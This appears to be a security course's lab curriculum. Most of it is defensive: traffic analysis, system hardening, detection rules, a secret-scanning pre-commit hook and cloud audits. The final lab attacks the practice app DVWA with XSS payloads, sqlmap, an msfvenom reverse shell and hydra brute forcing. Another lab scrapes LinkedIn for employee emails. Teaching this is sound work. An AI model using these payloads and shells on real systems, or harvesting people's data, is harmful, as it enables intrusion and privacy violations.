🌐 Week 1-2: Network & Security Fundamentals​

Lab 1: Network Reconnaissance​

Objective: Practice information gathering techniques

Tasks:

  1. Perform DNS enumeration
  2. Identify live hosts on network
  3. Map network topology
  4. Document findings

Tools: nmap, dig, whois, ping

Commands:

# DNS enumeration
dig target.com any
nslookup target.com
host -t mx target.com

# Network discovery
nmap -sn 192.168.1.0/24
nmap -sV -p- 192.168.1.100

# OS fingerprinting
nmap -O 192.168.1.100

# Service enumeration
nmap -sC -sV 192.168.1.100

Deliverable: Network diagram with identified hosts and services

Lab 2: Packet Analysis​

Objective: Analyze network traffic and identify anomalies

Tasks:

  1. Capture HTTP traffic
  2. Identify failed login attempts
  3. Detect port scanning
  4. Extract files from PCAP

Download Sample PCAPs:

  • Malware-Traffic-Analysis.net
  • Wireshark Sample Captures

Exercises:

# Capture traffic
sudo tcpdump -i eth0 -w capture.pcap

# Filter HTTP traffic
tcpdump -r capture.pcap 'tcp port 80'

# Extract HTTP objects in Wireshark
File > Export Objects > HTTP

# Analyze with tshark
tshark -r capture.pcap -Y "http.request"

Deliverable: Report of findings with screenshots

🐧 Week 3-4: Linux Fundamentals​

Lab 3: Linux Hardening​

Objective: Secure a Linux system

Scenario: You've been given a fresh Ubuntu server. Harden it according to security best practices.

Tasks:

  1. Disable root login
  2. Configure firewall
  3. Set up fail2ban
  4. Enable audit logging
  5. Implement password policies
  6. Remove unnecessary services

Commands:

# Disable root SSH
sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
sudo systemctl restart sshd

# Configure UFW
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw enable

# Install fail2ban
sudo apt install fail2ban
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
sudo systemctl enable fail2ban

# Password policy
sudo apt install libpam-pwquality
# Edit /etc/security/pwquality.conf
minlen = 12
dcredit = -1
ucredit = -1
lcredit = -1
ocredit = -1

# Remove unnecessary services
systemctl list-unit-files --state=enabled
sudo systemctl disable <service>

Deliverable: Hardening checklist and configuration files

Lab 4: Log Analysis Challenge​

Objective: Investigate security incident using logs

Download Sample Logs:

  • Security Onion Samples

Scenario: Multiple failed SSH login attempts detected. Find the attacker.

Tasks:

  1. Identify attack IP addresses
  2. Determine attack timeframe
  3. Check if attack was successful
  4. Recommend blocking rules

Commands:

# Failed SSH attempts
grep "Failed password" /var/log/auth.log

# Count by IP
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# Successful logins
grep "Accepted password" /var/log/auth.log

# Create ban rule
sudo ufw deny from <attacker-ip>

Deliverable: Incident report with timeline

🐍 Week 5-6: Python for Security​

Lab 5: Build a Port Scanner​

Objective: Create a multi-threaded port scanner

Requirements:

  • Accept target IP and port range
  • Multi-threaded scanning
  • Banner grabbing
  • Export results to CSV

Starter Code:

import socket
import threading
from queue import Queue

def scan_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            try:
                banner = sock.recv(1024).decode().strip()
            except:
                banner = "No banner"
            print(f"[+] Port {port} is open - {banner}")
        sock.close()
    except:
        pass

Lab 6: Web Scraping for OSINT​

Objective: Gather information from public sources

Tasks:

  1. Scrape LinkedIn for company employees
  2. Find email addresses
  3. Identify technologies used
  4. Generate OSINT report

Libraries: BeautifulSoup, requests, selenium

Example:

import requests
from bs4 import BeautifulSoup

def scrape_website(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    
    # Extract emails
    emails = []
    for tag in soup.find_all('a', href=True):
        if 'mailto:' in tag['href']:
            emails.append(tag['href'].replace('mailto:', ''))
    
    return emails

📊 Week 7-8: Traffic Analysis​

Lab 7: Malware Traffic Analysis​

Objective: Identify malicious network activity

Download:

  • Malware-Traffic-Analysis.net exercises

Scenario: Analyze PCAP file from infected host

Tasks:

  1. Identify infected host
  2. Find malware C&C server
  3. Extract malicious domains
  4. Determine malware family

Analysis Steps:

# Basic statistics
capinfos capture.pcap

# HTTP hosts
tshark -r capture.pcap -Y "http.request" -T fields -e http.host | sort -u

# DNS queries
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | sort -u

# Extract suspicious files
# In Wireshark: File > Export Objects > HTTP

# Check hashes on VirusTotal
sha256sum suspicious_file.exe

Lab 8: IDS Rule Creation​

Objective: Write Suricata rules to detect attacks

Scenarios:

  1. Detect SQL injection attempts
  2. Identify port scanning
  3. Alert on malware C&C
  4. Detect data exfiltration

Example Rules:

# SQL injection detection
alert http any any -> any any (msg:"SQL Injection Attempt"; \
  content:"union select"; nocase; \
  classtype:web-application-attack; sid:1000001;)

# Port scan detection
alert tcp any any -> any any (msg:"Possible Port Scan"; \
  flags:S; threshold:type both, track by_src, count 20, seconds 60; \
  classtype:attempted-recon; sid:1000002;)

# Suspicious DNS query
alert dns any any -> any any (msg:"Suspicious TLD .xyz"; \
  dns_query; content:".xyz"; nocase; \
  classtype:bad-unknown; sid:1000003;)

Test Rules:

# Test with sample PCAP
sudo suricata -c /etc/suricata/suricata.yaml -r capture.pcap

# View alerts
cat /var/log/suricata/fast.log

Deliverable: Rule set with documentation

🔀 Week 9: Git Fundamentals​

Lab 9: Secure Development Workflow​

Objective: Implement security in Git workflow

Tasks:

  1. Set up repository with security checks
  2. Create pre-commit hooks
  3. Implement branch protection
  4. Configure secret scanning

Setup:

# Initialize repo
git init security-project
cd security-project

# Install pre-commit hooks
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash

# Check for secrets
if git diff --staged | grep -iE "(password|api_key|secret|token)" ; then
    echo "❌ Possible secret detected!"
    exit 1
fi

# Check for large files
for file in $(git diff --staged --name-only); do
    if [ -f "$file" ]; then
        size=$(wc -c < "$file")
        if [ $size -gt 1048576 ]; then
            echo "❌ File $file is larger than 1MB"
            exit 1
        fi
    fi
done

echo "✅ Pre-commit checks passed"
EOF

chmod +x .git/hooks/pre-commit

# .gitignore for security
cat > .gitignore << 'EOF'
.env
*.key
*.pem
config/secrets.yml
credentials/
__pycache__/
*.pyc
EOF

Deliverable: Secure Git workflow documentation

📊 Week 10: ELK Stack​

Lab 10: Security Monitoring Dashboard​

Objective: Build complete security monitoring solution

Tasks:

  1. Deploy ELK Stack
  2. Ingest multiple log sources
  3. Create security dashboards
  4. Configure alerting

Setup:

# Start ELK with Docker Compose
docker-compose up -d

# Ingest SSH logs
cat > /etc/logstash/conf.d/ssh.conf << 'EOF'
input {
  file {
    path => "/var/log/auth.log"
    start_position => "beginning"
  }
}

filter {
  grok {
    match => { "message" => "%{SYSLOGTIMESTAMP:timestamp} %{HOSTNAME:hostname} sshd\[%{NUMBER:pid}\]: %{WORD:status} password for %{USERNAME:username} from %{IP:src_ip}" }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "ssh-logs-%{+YYYY.MM.dd}"
  }
}
EOF

Dashboard Requirements:

  • Failed login attempts (last 24h)
  • Top attacking IPs
  • Geographic map of attacks
  • Login attempts timeline
  • Alert on >10 failed logins from same IP

Deliverable: Working SIEM with dashboards

☁️ Week 11: Cloud Security​

Lab 11: AWS Security Assessment​

Objective: Audit AWS environment for security issues

Tasks:

  1. Review IAM policies
  2. Check security groups
  3. Verify S3 bucket permissions
  4. Enable CloudTrail logging

Assessment Script:

#!/bin/bash

echo "=== AWS Security Assessment ==="

# Check for root account usage
aws iam get-account-summary | grep "AccountMFAEnabled"

# List users without MFA
aws iam list-users --query 'Users[?not(MFAEnabled)]'

# Find overly permissive security groups
aws ec2 describe-security-groups \
  --filters "Name=ip-permission.cidr,Values=0.0.0.0/0" \
  --query 'SecurityGroups[?IpPermissions[?IpProtocol==`-1`]]'

# Check for public S3 buckets
aws s3api list-buckets --query 'Buckets[*].Name' | \
  xargs -I {} aws s3api get-bucket-acl --bucket {}

# Verify CloudTrail is enabled
aws cloudtrail describe-trails

# Generate report
echo "Assessment complete. Review findings above."

Deliverable: Security assessment report with remediation steps

Lab 12: Kubernetes Security​

Objective: Secure a Kubernetes cluster

Tasks:

  1. Implement Pod Security Policies
  2. Create Network Policies
  3. Set up RBAC
  4. Scan for vulnerabilities

Setup:

# Pod Security Policy
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  runAsUser:
    rule: 'MustRunAsNonRoot'
  fsGroup:
    rule: 'RunAsAny'
  seLinux:
    rule: 'RunAsAny'
  readOnlyRootFilesystem: true

---
# Network Policy - Deny all ingress
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all-ingress
spec:
  podSelector: {}
  policyTypes:
  - Ingress

Security Checks:

# Scan with kube-bench
kube-bench run --targets master,node

# Vulnerability scanning
trivy k8s --report summary cluster

# Check for privileged pods
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'

Deliverable: Hardened Kubernetes configuration

🎯 Week 12-13: Ethical Hacking​

Lab 13: Web Application Penetration Test​

Objective: Perform complete web app security assessment

Target: DVWA (Damn Vulnerable Web Application)

Tasks:

  1. Reconnaissance
  2. Vulnerability scanning
  3. Exploitation
  4. Post-exploitation
  5. Report writing

Methodology:

# 1. Reconnaissance
nmap -sV -p- dvwa.local
nikto -h http://dvwa.local
dirb http://dvwa.local

# 2. Test for SQL injection
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="security=low; PHPSESSID=xxx" \
  --dbs

# 3. Test for XSS
# Try payloads:
<script>alert(1)</script>
<img src=x onerror=alert(1)>

# 4. Test for file upload
# Upload PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=10.10.10.5 LPORT=4444 -f raw > shell.php

# 5. Brute force login
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  dvwa.local http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect"

Deliverable: Professional penetration test report
